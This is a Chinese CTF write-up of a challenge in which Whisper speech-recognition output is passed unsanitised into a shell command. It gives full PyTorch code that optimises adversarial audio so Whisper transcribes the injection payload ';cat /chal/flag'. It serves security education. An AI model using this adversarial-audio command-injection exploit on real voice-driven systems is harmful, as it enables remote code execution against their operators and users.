---
title: 第五届“湾区杯”CTF Final - Blind writeup
url: https://forum.butian.net/share/4688
source: 奇安信攻防社区
date: 2025-12-31
fetch_date: 2026-01-01T03:35:11.469462
---

# 第五届“湾区杯”CTF Final - Blind writeup

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 第五届“湾区杯”CTF Final - Blind writeup

* [CTF](https://forum.butian.net/topic/52)

本题描述了一个现实场景常见的模型：即无法采用多模态模型时，先使用ASR模型将语音转换为文字，接着调用大模型进行回答。

题目设计
----
> Thanks to the Real Hacker w1z(bi0s). What cool chall!
本题通过制作命令注入的漏洞点，期待选手对于Whisper模型的架构理解、音频解析方式、梯度传导和优化等细节进行探索。
WriteUP
-------
题目是一个AI助手，可以选择文字交流，或者上传音频进行对话。
代码审计发现 app.py 中语音识别模块存在命令拼接，将ASR模型识别的输出直接拼接，从而RCE
![2025-09-15-18-57-21.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-d0d0b522beecf299962784775ea0f6386fb299f0.png)
在下述代码发现模型输出中，包括了命令拼接所需要的符号：
![2025-09-15-19-00-58.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-6057dfb73034d737a7b070daeb8fc32d8e68d0cf.png)
那么可以尝试构造对抗样本，使得模型输出为
```bash
';cat /chal/flag'
```
拼接后变为
```bash
python3 chatbot.py '';cat /chal/flag''
```
通过源码（或者论文），whisper模型本质是encoder-decoder结构，大致过程可以描述为
![2025-09-15-19-10-03.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-f146af208d9c931f4b8ced0c02a1564843fec21c.png)
![2025-09-15-19-10-54.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-afdd4c8c48f5736e8bbbee310fceb7ae81b8c8a0.png)
进行对抗样本即可。
首先：需要在音频处理环节了解那些部分最终进入了模型，那些是预处理。这样才能合理捕捉梯度。
接着，在拿到梯度信息后，我们会思考，如何利用每一轮的梯度？下面给出几种不同的方式：
### 一直循环，逐token的方式去优化
```python
for i in range(num\_iterations):
tokens = torch.tensor([[50257, 50362]], device=DEVICE) # [SOT, EN]
for j in range(100000):
for target\_token in target\_tokens:
optimizer.zero\_grad()
mel = log\_mel\_spectrogram(adv, model.dims.n\_mels, padding=16000\*30)
mel = pad\_or\_trim(mel, 3000).to(model.device)
audio\_features = model.embed\_audio(mel)
logits = model.logits(tokens, audio\_features)[:, -1]
if torch.argmax(logits, dim=1) == target\_token:
break
loss = loss\_fn(logits, torch.tensor([target\_token], device=DEVICE))
loss.backward()
optimizer.step()
tokens = torch.cat([tokens, torch.tensor([[target\_token]], device=DEVICE)], dim=1)
print(tokens.tolist())
```
很烂，预测是一个整体过程，优化后得到了：\[SOT, token1, EN\]
但是无法保证在下次优化token2时，token1不被扰动。很容易在下次变为：\[SOT, bad\\_token, token2, EN\]
### 或者是累积梯度一次优化：
```python
for i in range(num\_iterations):
tokens = torch.tensor([[50257, 50362]], device=DEVICE) # [SOT, EN]
total\_loss = 0
for target\_token in target\_tokens:
optimizer.zero\_grad()
mel = log\_mel\_spectrogram(adv, model.dims.n\_mels, padding=16000\*30)
mel = pad\_or\_trim(mel, 3000).to(model.device)
audio\_features = model.embed\_audio(mel)
logits = model.logits(tokens, audio\_features)[:, -1]
loss = loss\_fn(logits, torch.tensor([target\_token], device=DEVICE))
total\_loss += loss
tokens = torch.cat([tokens, torch.tensor([[target\_token]], device=DEVICE)], dim=1)
total\_loss.backward()
optimizer.step()
adv.data = adv.data.clamp(-1, 1)
print(tokens.tolist())
```
也很烂，梯度累积太大了，很容易迷失在噪声中，根本找不到优化方向。
### 那么缩小噪声，每次优化从现实出发是，target tokens按照现实情况来：
```python
for i in range(num\_iterations):
tokens = torch.tensor([[50257, 50362]], device=DEVICE) # [SOT, EN]
total\_loss = 0
for target\_token in target\_tokens:
optimizer.zero\_grad()
mel = log\_mel\_spectrogram(adv, model.dims.n\_mels, padding=16000\*30)
mel = pad\_or\_trim(mel, 3000).to(model.device)
audio\_features = model.embed\_audio(mel)
logits = model.logits(tokens, audio\_features)[:, -1]
loss = loss\_fn(logits, torch.tensor([target\_token], device=DEVICE))
total\_loss += loss
tokens = torch.cat([tokens, torch.tensor([[torch.argmax(logits, dim=1)]], device=DEVICE)], dim=1)
total\_loss.backward()
optimizer.step()
adv.data = adv.data.clamp(-1, 1)
print(tokens.tolist())
```
bad，现实情况是梯度刚开始很好，后来慢慢炸掉。
### EXP
最终笔者找到了一种逐token去优化的方式，通过提前对齐来保证梯度不乱掉。
```python
import torch
from whisper import load\_model
from whisper.audio import log\_mel\_spectrogram, pad\_or\_trim
from whisper.tokenizer import get\_tokenizer
import torchaudio
from torch import nn
DEVICE = "mps"
target\_text = "';cat /chal/flag'"
model = load\_model("tiny.en.pt")
model.eval()
tokenizer = get\_tokenizer(
model.is\_multilingual,
num\_languages=model.num\_languages,
language="en",
task="transcribe",
)
target\_tokens = tokenizer.encode(target\_text)
target\_tokens = target\_tokens + [50256]
print(target\_tokens)
adv = torch.randn(1, 16000\*15, device=DEVICE, requires\_grad=True)
optimizer = torch.optim.Adam([adv], lr=0.01)
loss\_fn = nn.CrossEntropyLoss()
num\_iterations = 50
for i in range(num\_iterations):
tokens = torch.tensor([[50257, 50362]], device=DEVICE) # [SOT, EN]
for target\_token in target\_tokens:
optimizer.zero\_grad()
mel = log\_mel\_spectrogram(adv, model.dims.n\_mels, padding=16000\*30)
mel = pad\_or\_trim(mel, 3000).to(model.device)
audio\_features = model.embed\_audio(mel)
logits = model.logits(tokens, audio\_features)[:, -1]
loss = loss\_fn(logits, torch.tensor([target\_token], device=DEVICE))
loss.backward()
optimizer.step()
adv.data = adv.data.clamp(-1, 1)
tokens = torch.cat([tokens, torch.tensor([[target\_token]], device=DEVICE)], dim=1)
print(tokens.tolist())
print(f"Iteration {i+1}/{num\_iterations}, Loss: {loss.item():.4f}")
torchaudio.save("adversarial.wav", adv.detach().cpu(), 16000)
print("\nTranscribing generated adversarial audio:")
result = model.transcribe(adv.detach().cpu().squeeze(0))
```

* 发表于 2025-12-31 10:00:01
* 阅读 ( 189 )
* 分类：[AI 人工智能](https://forum.butian.net/community/AI)

1 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![Cain](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/47881)

[Cain](https://forum.butian.net/people/47881)

3 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![Cain](https://forum.butian.net/static/images/default_avatar.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![]()

---